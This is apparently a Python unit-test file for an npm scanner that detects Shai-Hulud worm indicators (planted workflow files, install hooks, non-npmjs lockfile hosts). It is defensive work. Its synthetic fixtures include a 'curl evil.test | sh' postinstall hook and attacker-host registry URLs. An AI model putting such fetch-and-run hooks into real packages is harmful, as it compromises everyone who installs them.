"""Unit tests for `scripts/npm_ioc_sweep.py`.

Exercises each of the three Shai-Hulud IoC checks against synthetic
input: a clean tree, a tree with each individual IoC present, and the
real repo tree (must be clean).
"""
from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
SWEEP = ROOT / "scripts" / "npm_ioc_sweep.py"


def _load_module():
    """Import scripts/npm_ioc_sweep.py as a module so we can call its
    individual check functions in-process. Subprocess-only testing would
    triple the test runtime and the fail-mode messages aren't as easy to
    assert on.
    """
    spec = importlib.util.spec_from_file_location("npm_ioc_sweep", SWEEP)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _write_minimal_lockfile(path: Path, packages: dict) -> None:
    """Write a minimal npm v3 lockfile shape so the per-package walkers
    have something concrete to traverse. `packages` is the value of the
    top-level `packages` field.
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "name": "synthetic",
                "version": "0.0.0",
                "lockfileVersion": 3,
                "requires": True,
                "packages": packages,
            },
            indent=2,
        ),
        encoding="utf-8",
    )


# ---- check 1: shai-hulud-workflow.yml ----


def test_check1_clean_when_workflow_absent(tmp_path):
    mod = _load_module()
    out = mod.check_no_shai_hulud_workflow(tmp_path)
    assert out == [], f"clean tree must produce no offenders; got {out}"


def test_check1_fires_when_workflow_present(tmp_path):
    mod = _load_module()
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    bad = workflows / "shai-hulud-workflow.yml"
    bad.write_text("# attacker payload would go here\n", encoding="utf-8")
    out = mod.check_no_shai_hulud_workflow(tmp_path)
    assert len(out) == 1, f"expected one offender; got {out}"
    assert "shai-hulud-workflow.yml" in out[0]


def test_check1_skips_git_and_node_modules(tmp_path):
    """`node_modules/` and `.git/` can legitimately mirror upstream
    content; the IoC check is about *tracked source* so these are
    skipped.
    """
    mod = _load_module()
    for skip_dir in ("node_modules", ".git", "target", "__pycache__", ".venv"):
        path = tmp_path / skip_dir / "shai-hulud-workflow.yml"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("not a real find\n", encoding="utf-8")
    out = mod.check_no_shai_hulud_workflow(tmp_path)
    assert out == [], f"skip-dir hits must be ignored; got {out}"


# ---- check 2: lifecycle scripts ----


def test_check2_clean_with_no_scripts(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "": {"name": "host"},
            "node_modules/lodash": {
                "version": "4.17.21",
                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
            },
        },
    )
    out = mod.check_no_lifecycle_scripts(lockfile)
    assert out == [], f"clean lockfile must produce no offenders; got {out}"


def test_check2_fires_on_postinstall(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "": {"name": "host"},
            "node_modules/malicious": {
                "version": "1.0.0",
                "resolved": "https://registry.npmjs.org/malicious/-/malicious-1.0.0.tgz",
                "scripts": {"postinstall": "curl evil.test | sh"},
            },
        },
    )
    out = mod.check_no_lifecycle_scripts(lockfile)
    assert len(out) == 1, f"expected one offender; got {out}"
    assert "postinstall" in out[0]
    assert "malicious" in out[0]


def test_check2_fires_on_preinstall(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "node_modules/sneaky": {
                "version": "0.0.1",
                "resolved": "https://registry.npmjs.org/sneaky/-/sneaky-0.0.1.tgz",
                "scripts": {"preinstall": "node payload.js"},
            },
        },
    )
    out = mod.check_no_lifecycle_scripts(lockfile)
    assert len(out) == 1, f"expected one offender; got {out}"
    assert "preinstall" in out[0]


def test_check2_handles_missing_lockfile(tmp_path):
    """If the lockfile doesn't exist (the workspace just doesn't use npm
    in this directory), the check is a no-op.
    """
    mod = _load_module()
    out = mod.check_no_lifecycle_scripts(tmp_path / "nope.json")
    assert out == [], f"missing lockfile must be no-op; got {out}"


def test_check2_fires_on_malformed_lockfile(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    lockfile.write_text("{not valid json", encoding="utf-8")
    out = mod.check_no_lifecycle_scripts(lockfile)
    assert len(out) == 1
    assert "not valid JSON" in out[0]


# ---- check 3: lockfile hosts ----


def test_check3_clean_when_all_hosts_npmjs(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "node_modules/foo": {
                "version": "1.0.0",
                "resolved": "https://registry.npmjs.org/foo/-/foo-1.0.0.tgz",
            },
            "node_modules/bar": {
                "version": "2.0.0",
                "resolved": "https://registry.npmjs.org/bar/-/bar-2.0.0.tgz",
            },
        },
    )
    out = mod.check_lockfile_hosts(lockfile)
    assert out == [], f"all-npmjs lockfile must be clean; got {out}"


def test_check3_fires_on_git_plus_url(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "node_modules/sus": {
                "version": "1.0.0",
                "resolved": "git+https://github.com/attacker/sus.git#abc123",
            },
        },
    )
    out = mod.check_lockfile_hosts(lockfile)
    assert len(out) == 1
    assert "non-https" in out[0]


def test_check3_fires_on_attacker_host(tmp_path):
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "node_modules/sus": {
                "version": "1.0.0",
                "resolved": "https://registry.attacker.test/sus/-/sus-1.0.0.tgz",
            },
        },
    )
    out = mod.check_lockfile_hosts(lockfile)
    assert len(out) == 1
    assert "non-allowlisted host" in out[0]
    assert "registry.attacker.test" in out[0]


def test_check3_skips_resolved_omitted(tmp_path):
    """Workspace-root and peer-only entries legitimately omit
    `resolved` per the npm lockfile spec.
    """
    mod = _load_module()
    lockfile = tmp_path / "package-lock.json"
    _write_minimal_lockfile(
        lockfile,
        {
            "": {"name": "host"},
            "node_modules/some-peer": {"version": "1.0.0", "peer": True},
        },
    )
    out = mod.check_lockfile_hosts(lockfile)
    assert out == [], f"resolved-omitted entries must be skipped; got {out}"


# ---- end-to-end sweep ----


def test_sweep_on_real_repo_passes():
    """The real repo must be clean — sanity check that the script's
    happy path round-trips, and a regression alarm if the lockfile ever
    grows an IoC.
    """
    r = subprocess.run(
        [sys.executable, str(SWEEP)],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert r.returncode == 0, (
        f"npm-ioc-sweep failed on the real repo; stdout: {r.stdout}; stderr: {r.stderr}"
    )
    # Every check should have surfaced a positive "OK" line.
    assert "check 1 (no `shai-hulud-workflow.yml`) — OK" in r.stdout
    assert "check 2 (no preinstall/postinstall" in r.stdout and "OK" in r.stdout
    assert "check 3 (registry.npmjs.org only" in r.stdout and "OK" in r.stdout


def test_sweep_nonzero_on_synthetic_offender(tmp_path):
    """Subprocess-level smoke test: a synthetic repo with one IoC
    triggers exit 1 and surfaces the offender to stderr.
    """
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "shai-hulud-workflow.yml").write_text("# bad\n", encoding="utf-8")
    r = subprocess.run(
        [sys.executable, str(SWEEP), "--repo-root", str(tmp_path)],
        cwd=ROOT,
        capture_output=True,
        text=True,
    )
    assert r.returncode == 1, f"expected exit 1; got {r.returncode}; stderr: {r.stderr}"
    assert "shai-hulud-workflow.yml" in r.stderr
    assert "FAIL" in r.stderr
